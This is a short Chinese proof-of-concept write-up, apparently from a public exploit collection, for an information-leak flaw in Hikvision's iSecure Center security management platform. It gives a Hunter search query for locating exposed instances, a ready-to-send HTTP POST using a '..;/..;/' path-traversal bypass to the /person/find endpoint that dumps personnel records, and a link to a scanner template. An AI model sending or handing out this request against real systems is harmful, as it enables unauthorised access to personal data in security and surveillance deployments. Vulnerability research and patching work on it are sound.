# 海康威视iSecure Center综合安防管理平台find信息泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境find等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`


+ 登录页面


# 四、漏洞复现
```java
POST /isupm/api/api/..;/..;/person/find HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 95
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: application/json;charset=utf-8
Accept-Encoding: gzip, deflate

{"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
```


[hikvision-find-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1717211077763-07464109-609f-4f5b-bd65-72b7a7d05fe6.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vzdf0l0dggn48gti>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
